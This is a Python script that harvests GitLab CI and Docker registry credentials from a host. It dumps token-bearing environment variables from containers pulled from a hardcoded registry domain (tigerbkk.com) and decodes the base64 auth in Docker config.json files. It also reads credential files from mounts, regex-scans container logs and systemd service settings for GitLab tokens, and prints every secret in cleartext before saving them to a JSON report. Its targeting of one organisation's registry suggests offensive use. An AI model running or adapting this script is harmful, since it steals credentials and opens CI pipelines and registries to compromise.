#!/usr/bin/env python3

import subprocess
import json
import re
import os
from datetime import datetime

class TargetedGitLabCIExtractor:
    def __init__(self):
        self.findings = []
        self.gitlab_containers = []
        
    def find_gitlab_connected_containers(self):
        """Find containers connected to GitLab registry"""
        print("🎯 Finding GitLab-connected containers...")
        
        try:
            # Get all running containers with detailed info
            result = subprocess.run([
                'docker', 'ps', '--format', 
                '{{.ID}}\t{{.Image}}\t{{.Names}}\t{{.Status}}'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                gitlab_connected = []
                
                for line in lines:
                    if line and '\t' in line:
                        parts = line.split('\t')
                        container_id = parts[0]
                        image = parts[1]
                        name = parts[2]
                        status = parts[3]
                        
                        # Check if image is from GitLab registry
                        if any(registry in image for registry in [
                            'docker-registry.tigerbkk.com',
                            'gitlab.tigerbkk.com',
                            'registry.gitlab.com'
                        ]):
                            container_info = {
                                'id': container_id,
                                'image': image,
                                'name': name,
                                'status': status
                            }
                            gitlab_connected.append(container_info)
                            self.gitlab_containers.append(container_info)
                            print(f"  🎯 {name} ({image})")
                
                print(f"✅ Found {len(gitlab_connected)} GitLab-connected containers")
                return gitlab_connected
                
        except Exception as e:
            print(f"❌ Error finding GitLab containers: {e}")
            
        return []
    
    def extract_container_environment(self, container_id, container_name):
        """Extract all environment variables from container"""
        print(f"\n🔍 Extracting environment from {container_name} ({container_id[:12]})")
        
        ci_vars = {}
        
        try:
            # Get all environment variables
            result = subprocess.run([
                'docker', 'exec', container_id, 'env'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                env_vars = result.stdout.strip().split('\n')
                
                for env_var in env_vars:
                    if '=' in env_var:
                        key, value = env_var.split('=', 1)
                        
                        # Look for any CI/GitLab related variables
                        if any(pattern in key.upper() for pattern in [
                            'CI_', 'GITLAB', 'GIT_', 'RUNNER', 'TOKEN', 'REGISTRY', 'DOCKER_AUTH'
                        ]):
                            ci_vars[key] = value
                            print(f"  🔑 {key}={value}")
                
                if ci_vars:
                    self.findings.append({
                        'type': 'container_ci_vars',
                        'container': container_name,
                        'container_id': container_id,
                        'variables': ci_vars
                    })
                else:
                    print("  ℹ️ No CI variables found in environment")
                    
        except Exception as e:
            print(f"  ❌ Error extracting environment: {e}")
            
        return ci_vars
    
    def check_docker_config_auth(self):
        """Check Docker configuration for registry authentication"""
        print("\n🔐 Checking Docker registry authentication...")
        
        docker_config_locations = [
            '/root/.docker/config.json',
            '/home/*/.docker/config.json',
            '~/.docker/config.json'
        ]
        
        for config_path in docker_config_locations:
            try:
                if config_path.startswith('~'):
                    config_path = os.path.expanduser(config_path)
                    
                if '*' in config_path:
                    # Use find to locate config files
                    result = subprocess.run([
                        'find', '/home/', '-name', 'config.json', '-path', '*/.docker/*'
                    ], capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        config_files = result.stdout.strip().split('\n')
                        for config_file in config_files:
                            if config_file:
                                self.parse_docker_config(config_file)
                else:
                    if os.path.exists(config_path):
                        self.parse_docker_config(config_path)
                        
            except Exception as e:
                print(f"  ❌ Error checking {config_path}: {e}")
    
    def parse_docker_config(self, config_file):
        """Parse Docker config.json for registry auth"""
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                
            print(f"  📄 Found Docker config: {config_file}")
            
            # Check auths section
            auths = config.get('auths', {})
            for registry, auth_info in auths.items():
                if any(gitlab_host in registry for gitlab_host in [
                    'docker-registry.tigerbkk.com',
                    'gitlab.tigerbkk.com',
                    'registry.gitlab.com'
                ]):
                    print(f"    🎯 GitLab registry auth found: {registry}")
                    
                    if 'auth' in auth_info:
                        # Decode base64 auth
                        import base64
                        try:
                            decoded_auth = base64.b64decode(auth_info['auth']).decode('utf-8')
                            username, password = decoded_auth.split(':', 1)
                            print(f"      👤 Username: {username}")
                            print(f"      🔑 Password/Token: {password}")
                            
                            self.findings.append({
                                'type': 'docker_registry_auth',
                                'registry': registry,
                                'username': username,
                                'password': password,
                                'config_file': config_file
                            })
                        except Exception as e:
                            print(f"      ❌ Error decoding auth: {e}")
                            
        except Exception as e:
            print(f"  ❌ Error parsing {config_file}: {e}")
    
    def check_container_mounts(self, container_id, container_name):
        """Check container mounts for GitLab credentials"""
        print(f"\n📁 Checking mounts for {container_name}")
        
        try:
            # Get container mount information
            result = subprocess.run([
                'docker', 'inspect', container_id, '--format', 
                '{{range .Mounts}}{{.Type}}:{{.Source}}->{{.Destination}} {{end}}'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                mounts = result.stdout.strip().split(' ')
                
                for mount in mounts:
                    if mount and '->' in mount:
                        mount_type, paths = mount.split(':', 1)
                        source, destination = paths.split('->', 1)
                        
                        # Check if mount contains GitLab-related paths
                        if any(keyword in source.lower() for keyword in [
                            'gitlab', 'runner', 'ci', 'git'
                        ]) or any(keyword in destination.lower() for keyword in [
                            'gitlab', 'runner', 'ci', 'git'
                        ]):
                            print(f"  📂 Interesting mount: {source} -> {destination}")
                            
                            # Try to read files from mounted location
                            self.check_mount_for_credentials(source, destination, container_id)
                            
        except Exception as e:
            print(f"  ❌ Error checking mounts: {e}")
    
    def check_mount_for_credentials(self, source, destination, container_id):
        """Check mounted directories for GitLab credentials"""
        
        # Common GitLab credential file names
        credential_files = [
            'config.toml',
            '.gitlab-ci.yml',
            'gitlab.yml',
            'config.yml',
            'credentials',
            '.env',
            'secrets'
        ]
        
        for cred_file in credential_files:
            try:
                # Try to read from container
                container_path = f"{destination.rstrip('/')}/{cred_file}"
                
                result = subprocess.run([
                    'docker', 'exec', container_id, 'cat', container_path
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    content = result.stdout
                    print(f"    📄 Found {cred_file} in mount")
                    
                    # Extract tokens from content
                    self.extract_tokens_from_content(content, f"mount:{container_path}")
                    
            except Exception as e:
                continue
                
            # Also try to read from host
            try:
                host_path = f"{source.rstrip('/')}/{cred_file}"
                if os.path.exists(host_path):
                    with open(host_path, 'r') as f:
                        content = f.read()
                        print(f"    📄 Found {cred_file} on host")
                        self.extract_tokens_from_content(content, f"host:{host_path}")
            except Exception as e:
                continue
    
    def extract_tokens_from_content(self, content, source):
        """Extract GitLab tokens from content"""
        
        patterns = {
            'ci_job_token': r'CI_JOB_TOKEN[=:]\s*([a-zA-Z0-9_-]+)',
            'ci_registry_password': r'CI_REGISTRY_PASSWORD[=:]\s*([a-zA-Z0-9_-]+)',
            'gitlab_token': r'GITLAB_TOKEN[=:]\s*([a-zA-Z0-9_-]+)',
            'private_token': r'PRIVATE_TOKEN[=:]\s*([a-zA-Z0-9_-]+)',
            'runner_token': r'token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
            'registration_token': r'registration-token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
            'personal_access_token': r'(glpat-[a-zA-Z0-9_-]{20,})',
            'deploy_token': r'(gldt-[a-zA-Z0-9_-]{20,})',
            'bearer_token': r'Bearer\s+([a-zA-Z0-9._-]+)',
            'docker_password': r'password[=:]\s*["\']([^"\']+)["\']'
        }
        
        found_tokens = {}
        
        for token_type, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                found_tokens[token_type] = matches
                print(f"    🎯 Found {token_type}: {matches}")
                
        if found_tokens:
            self.findings.append({
                'type': 'extracted_tokens',
                'source': source,
                'tokens': found_tokens
            })
    
    def check_gitlab_runner_processes(self):
        """Check for running GitLab Runner processes"""
        print("\n🏃 Checking for GitLab Runner processes...")
        
        try:
            # Check for gitlab-runner processes
            result = subprocess.run([
                'ps', 'aux'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                processes = result.stdout.split('\n')
                
                for process in processes:
                    if 'gitlab-runner' in process.lower():
                        print(f"  🏃 Found runner process: {process}")
                        
                        self.findings.append({
                            'type': 'runner_process',
                            'process': process
                        })
                        
        except Exception as e:
            print(f"❌ Error checking processes: {e}")
    
    def check_systemd_services(self):
        """Check for GitLab-related systemd services"""
        print("\n⚙️ Checking systemd services...")
        
        try:
            result = subprocess.run([
                'systemctl', 'list-units', '--type=service', '--state=running'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                services = result.stdout.split('\n')
                
                for service in services:
                    if any(keyword in service.lower() for keyword in ['gitlab', 'runner', 'ci']):
                        print(f"  ⚙️ Found service: {service}")
                        
                        # Get service status with more details
                        service_name = service.split()[0] if service.split() else ''
                        if service_name:
                            self.get_service_details(service_name)
                        
        except Exception as e:
            print(f"❌ Error checking services: {e}")
    
    def get_service_details(self, service_name):
        """Get detailed information about a service"""
        try:
            result = subprocess.run([
                'systemctl', 'show', service_name, '--property=ExecStart,Environment,EnvironmentFile'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                details = result.stdout.strip()
                if details:
                    print(f"    📋 Service details for {service_name}:")
                    print(f"    {details}")
                    
                    self.findings.append({
                        'type': 'systemd_service',
                        'service_name': service_name,
                        'details': details
                    })
                    
        except Exception as e:
            print(f"    ❌ Error getting service details: {e}")
    
    def check_container_logs_for_tokens(self, container_id, container_name):
        """Check container logs for GitLab tokens"""
        print(f"\n📋 Checking logs for {container_name}")
        
        try:
            # Get recent container logs
            result = subprocess.run([
                'docker', 'logs', '--tail=100', container_id
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                logs = result.stdout + result.stderr  # Combine stdout and stderr
                
                # Look for tokens in logs
                self.extract_tokens_from_content(logs, f"logs:{container_name}")
                
                # Also look for GitLab URLs and configuration info
                gitlab_info = re.findall(r'gitlab[^\\s]*', logs, re.IGNORECASE)
                if gitlab_info:
                    print(f"  🔗 GitLab references in logs: {set(gitlab_info)}")
                    
        except Exception as e:
            print(f"  ❌ Error checking logs: {e}")
    
    def generate_report(self):
        """Generate extraction report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"targeted_gitlab_extraction_{timestamp}.json"
        
        report = {
            'extraction_timestamp': timestamp,
            'gitlab_containers': len(self.gitlab_containers),
            'total_findings': len(self.findings),
            'containers': self.gitlab_containers,
            'findings': self.findings
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
            
        # Generate readable summary
        print(f"\n📊 Report saved to: {report_file}")
        
        # Print key findings
        if self.findings:
            print("\n🎯 KEY FINDINGS:")
            
            for finding in self.findings:
                finding_type = finding.get('type', 'unknown')
                
                if finding_type == 'docker_registry_auth':
                    print(f"  🔐 Registry Auth: {finding['registry']}")
                    print(f"    Username: {finding['username']}")
                    print(f"    Password: {finding['password']}")
                    
                elif finding_type == 'extracted_tokens':
                    print(f"  🎯 Tokens from {finding['source']}:")
                    for token_type, tokens in finding['tokens'].items():
                        for token in tokens:
                            print(f"    {token_type}: {token}")
                            
                elif finding_type == 'container_ci_vars':
                    print(f"  🔧 CI Variables in {finding['container']}:")
                    for key, value in finding['variables'].items():
                        print(f"    {key}={value}")
    
    def run_targeted_extraction(self):
        """Run targeted GitLab CI extraction"""
        print("🚀 Starting Targeted GitLab CI Extraction")
        print("=" * 80)
        
        # Find GitLab-connected containers
        gitlab_containers = self.find_gitlab_connected_containers()
        
        # Check Docker configuration for registry auth
        self.check_docker_config_auth()
        
        # Analyze each GitLab-connected container
        for container in gitlab_containers:
            container_id = container['id']
            container_name = container['name']
            
            print(f"\n🔍 Deep analysis of {container_name}")
            print("-" * 50)
            
            # Extract environment variables
            self.extract_container_environment(container_id, container_name)
            
            # Check container mounts
            self.check_container_mounts(container_id, container_name)
            
            # Check container logs
            self.check_container_logs_for_tokens(container_id, container_name)
        
        # Check for GitLab Runner processes
        self.check_gitlab_runner_processes()
        
        # Check systemd services
        self.check_systemd_services()
        
        # Generate report
        self.generate_report()
        
        print("\n✅ Targeted extraction completed!")

def main():
    extractor = TargetedGitLabCIExtractor()
    extractor.run_targeted_extraction()

if __name__ == "__main__":
    main()
